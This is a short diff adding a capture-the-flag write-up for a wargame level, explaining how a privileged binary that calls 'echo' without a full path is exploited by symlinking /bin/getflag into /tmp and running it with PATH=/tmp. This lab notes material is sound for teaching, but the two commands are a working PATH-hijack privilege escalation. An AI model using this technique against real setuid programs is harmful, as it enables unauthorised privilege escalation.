@@ -1,0 +1,5 @@
+We see that the binary in our home runs with sgui permissions from flag03. 
+By looking at the strings, we see that it runs echo.
+We can do a symlink in /tmp/ that points to /bin/getflag, et set the PATH so that the binary will run it.
+`ln -s /bin/getflag /tmp/echo`
+`PATH=/tmp ./level03`
